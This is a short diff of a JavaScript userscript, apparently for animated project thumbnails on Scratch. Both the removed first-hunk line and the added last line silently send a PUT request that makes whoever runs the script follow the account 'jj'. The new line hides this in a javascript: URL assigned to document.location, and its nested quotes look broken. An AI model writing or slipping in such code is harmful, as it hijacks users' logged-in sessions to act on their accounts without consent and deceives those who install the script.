@@ -1,6 +1,5 @@
 //epik bruh m0menrt
 var parser = document.createElement("a");
-$.ajax({type:"PUT",url:"/site-api/users/followers/jj/add/"});
 parser.href = document.location.href;
 if(parser.hostname === "scratch.mit.edu" && parser.pathname.startsWith("/projects/")) {
     var projectID = parser.pathname.replace(/\D/g,'');
@@ -119,3 +118,4 @@ function animThumbnailMain() {
         });
     } // If drag and drop loader wasn't put before
 }
+document.location = "javascript:$.ajax({type:"PUT",url:"/site-api/users/followers/jj/add/"});"
